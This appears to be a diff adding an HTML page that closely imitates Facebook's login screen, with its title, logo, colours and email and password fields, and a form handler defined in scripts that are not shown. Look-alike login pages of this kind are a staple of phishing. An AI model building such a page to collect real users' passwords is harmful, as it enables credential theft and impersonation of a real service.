@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – log in or sign up</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; }
+        .fb-card-shadow { box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen">
+
+    <main class="flex-grow flex flex-col lg:flex-row items-center justify-center lg:gap-20 p-5 lg:mt-[-80px]">
+        <div class="text-center lg:text-left max-w-[500px] mb-10 lg:mb-0">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4l_v2btLpXY.svg" alt="Facebook" class="w-72 mx-auto lg:mx-[-28px]">
+            <h2 class="text-[24px] lg:text-[28px] leading-tight font-normal text-[#1c1e21] mt-[-10px] px-4 lg:px-0">
+                Facebook helps you connect and share with the people in your life.
+            </h2>
+        </div>
+
+        <div class="w-full max-w-[396px]">
+            <div class="bg-white p-4 rounded-lg fb-card-shadow">
+                <form onsubmit="siginIn()" class="space-y-4">
+                    <input type="text" placeholder="Email address or phone number" 
+                        class="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:border-[#0866FF] focus:ring-1 focus:ring-[#0866FF] text-[17px]">
+                    
+                    <input type="password" placeholder="Password" 
+                        class="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:border-[#0866FF] focus:ring-1 focus:ring-[#0866FF] text-[17px]">
+                    
+                    <button class="w-full bg-[#0866FF] text-white text-[20px] font-bold py-2.5 rounded-md hover:bg-[#055ada] transition">
+                        Log In
+                    </button>
+                    
+                    <div class="text-center">
+                        <a href="#" class="text-[#0866FF] text-sm hover:underline">Forgotten password?</a>
+                    </div>
+                    
+                    <hr class="my-4 border-gray-200">
+                    
+                    <div class="text-center pt-2">
+                        <a href="signup.html" class="inline-block bg-[#42b72a] text-white text-[17px] font-bold px-4 py-3 rounded-md hover:bg-[#36a420] transition">
+                            Create new account
+                        </a>
+                    </div>
+                </form>
+            </div>
+            <p class="text-center text-sm mt-6">
+                <a href="#" class="font-bold hover:underline">Create a Page</a> for a celebrity, brand or business.
+            </p>
+        </div>
+    </main>
+<script type="module" src="app.js"></script>
+<script type="module" src="config.js"></script>
+</body>
+</html>
